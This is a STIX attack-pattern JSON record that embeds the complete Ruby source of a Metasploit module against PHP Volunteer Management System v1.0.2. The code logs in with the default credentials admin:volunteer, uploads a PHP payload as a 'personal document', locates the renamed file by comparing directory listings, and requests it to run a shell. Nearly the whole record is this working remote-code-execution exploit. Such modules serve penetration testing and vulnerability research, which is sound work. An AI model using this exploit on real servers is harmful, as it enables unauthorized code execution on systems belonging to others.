{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--37a0019d-9afa-4a05-9f7d-4ed86eed37b9",
    "created": "2024-08-14T17:10:56.060976Z",
    "modified": "2024-08-14T17:10:56.06098Z",
    "name": "\"PHP Volunteer Management System v1.0.2 Arbitrary File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability found in PHP Volunteer Management System version v1.0.2 or prior.  This application has an upload feature that allows an authenticated user to upload anything to the 'uploads' directory, which is actually reachable by anyone without a credential.  An attacker can easily abuse this upload functionality first by logging in with the default credential (admin:volunteer) upload a malicious payload, and then execute it by sending another GET request.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/php_volunteer_upload_exec.rb",
            "external_id": "php_volunteer_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"PHP Volunteer Management System v1.0.2 Arbitrary File Upload Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in PHP Volunteer Management System,\n        version v1.0.2 or prior.  This application has an upload feature that allows an\n        authenticated user to upload anything to the 'uploads' directory, which is actually\n        reachable by anyone without a credential.  An attacker can easily abuse this upload\n        functionality first by logging in with the default credential (admin:volunteer),\n        upload a malicious payload, and then execute it by sending another GET request.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Ashoo <ashoo.online[at]gmail.com>',\n          'sinn3r' #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '82391'],\n          ['EDB', '18941'],\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['PHP Volunteer Management 1.0.2', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-05-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the web application', '/bf102/']),\n        OptString.new('USERNAME',  [true, 'The username to login', 'admin']),\n        OptString.new('PASSWORD',  [true, 'The password to login', 'volunteer'])\n      ])\n  end\n\n\n  #\n  # Login to the web application.\n  # When you send the very first request to the app, you're assigned with a cookie called\n  # 'PHPVolunteerManagent'.  This is something you must keep, because after authentication,\n  # that same cookie becomes your auth token.\n  #\n  def login(base, username, password)\n    # Get cookie: PHPVolunteerManagent\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => \"#{base}index.php\"\n    })\n\n    # If we don't get a cookie, bail!\n    if res and res.get_cookies =~ /(PHPVolunteerManagent=\\w+);*/\n      cookie = $1\n      vprint_status(\"Found cookie: #{cookie}\")\n    else\n      return nil\n    end\n\n    # Find the location for login\n    login_location = res.headers['Location'] || '?p=login'\n\n    # And then login!\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => \"#{base}index.php#{login_location}\",\n      'cookie'    => cookie,\n      'vars_post' => {\n        'volunteer_email'    => username,\n        'volunteer_password' => password,\n        'submit'             => 'Login!'\n      }\n    })\n\n    # If the app wants to redirect us to the dashboard, we\n    # assume the login was successful\n    if res and res.headers['Location'] =~ /\\?p\\=dashboard/\n      return cookie\n    else\n      return nil\n    end\n  end\n\n\n  #\n  # Upload the payload as a personal document.\n  # This will save the file in: mods/documents/uploads/\n  # And then we return the HTTP response, which should contain some message indicating\n  # whether we successfully uploaded the file, or not.\n  #\n  def upload(base, cookie, fname, file, description)\n    boundary = \"----WebKitFormBoundary#{rand_text_alpha(10)}\"\n\n    endpoint = \"#{rhost}\"\n    endpoint << \":#{rport}\" if rport.to_i != 80\n\n    data_post  = \"--#{boundary}\\r\\n\"\n    data_post << \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"#{fname}\\\"\\r\\n\"\n    data_post << \"Content-Type: text/php\\r\\n\"\n    data_post << \"\\r\\n\"\n    data_post << file\n    data_post << \"\\r\\n\"\n    data_post << \"--#{boundary}\\r\\n\"\n    data_post << \"Content-Disposition: form-data; name=\\\"description\\\"\\r\\n\"\n    data_post << \"\\r\\n\"\n    data_post << description\n    data_post << \"\\r\\n\"\n    data_post << \"--#{boundary}\\r\\n\"\n    data_post << \"Content-Disposition: form-data; name=\\\"submit\\\"\\r\\n\"\n    data_post << \"\\r\\n\"\n    data_post << \"Submit\"\n    data_post << \"\\r\\n\"\n    data_post << \"--#{boundary}--\\r\\n\"\n\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => \"#{base}index.php?p=upload_personal_document\",\n      'cookie'  => cookie,\n      'ctype'   => \"multipart/form-data; boundary=#{boundary}\",\n      'data'    => data_post,\n      'headers' => {\n        'Referer' => \"http://#{endpoint}#{base}index.php?p=upload_personal_document\"\n      }\n    })\n\n    return res\n  end\n\n\n  #\n  # Find all the new files from the 'uploads' directory.\n  # This trick is necessary, because when we upload a file, our filename\n  # is renamed to something else with a timestamp.  Since we cannot reliability\n  # guess what the filename is going to be, we can at least compare both before/after\n  # snapshots to figure it out.\n  #\n  def get_my_file(before, after)\n    r = /\\<td\\>\\<a href\\=\\\"(\\d{4}\\-\\d{2}\\-\\d{2}\\_\\d+\\-\\d+\\-\\d+\\_\\d+\\.\\w+)\\\"\\>\\d{4}\\-\\d{2}\\-\\d{2}\\_\\d+\\-\\d+\\-\\d+\\_\\d+\\.\\w+\\<\\/a\\>\\<\\/td\\>/\n    b = (before.scan(r) || []).flatten\n    a = (after.scan(r)  || []).flatten\n\n    # Return all the new uploads\n    return a - b\n  end\n\n\n  #\n  # This function will return the raw HTTP response like a snapshot,\n  # which later can be used for comparision.\n  #\n  def peek_uploads(base, cookie)\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => \"#{base}mods/documents/uploads/\",\n      'cookie' => cookie\n    })\n\n    return res\n  end\n\n\n  #\n  # The exploit function does exploity things\n  #\n  def exploit\n    base = normalize_uri(target_uri.path)\n    base << '/' if base[-1, 1] != '/'\n\n    # Login\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    cookie = login(base, username, password)\n    if cookie.nil?\n      print_error(\"Login failed with \\\"#{username}:#{password}\\\"\")\n      return\n    end\n\n    print_good(\"Login Successful (#{username}:#{password})\")\n\n    # Take a snapshot of the uploads directory\n    # Viewing this doesn't actually require the user to login first,\n    # but we supply the cookie anyway to act more like a real user.\n    print_status(\"Enumerating all the uploads...\")\n    before = peek_uploads(base, cookie)\n    if before.nil?\n      print_error(\"Unable to enumerate original uploads\")\n      return\n    end\n\n    # Upload our PHP shell\n    print_status(\"Uploading PHP payload (#{payload.encoded.length.to_s} bytes)\")\n    fname = rand_text_alpha(rand(10)+6) + '.php'\n    desc  = rand_text_alpha(rand(10)+5)\n    php   = %Q|<?php #{payload.encoded} ?>|\n    res = upload(base, cookie, fname, php, desc)\n    if res.nil? or res.body !~ /The file was successfuly uploaded/\n      print_error(\"Failed to upload our file\")\n      return\n    end\n\n    # Now that we've uploaded our shell, let's take another snapshot\n    # of the uploads directory.\n    print_status(\"Enumerating new uploads...\")\n    after = peek_uploads(base, cookie)\n    if after.nil?\n      print_error(\"Unable to enumerate latest uploads\")\n      return\n    end\n\n    # Find the filename of our uploaded shell\n    files = get_my_file(before.body, after.body)\n    if files.empty?\n      print_error(\"No new file(s) found. The upload probably failed\")\n      return\n    else\n      vprint_status(\"Found these new files: #{files.inspect}\")\n    end\n\n    # There might be more than 1 new file, at least execute the first 10\n    # just to make sure.  Don't want to try too many either.\n    counter = 0\n    files.each do |f|\n      counter += 1\n      break if counter > 10\n      print_status(\"Trying file: #{f}\")\n      send_request_raw({\n        'method' => 'GET',\n        'uri'    => normalize_uri(base, 'mods/documents/uploads/', f),\n        'cookie' => cookie\n      })\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-05-28",
    "x_mitre_platforms": [
        "php'"
    ]
}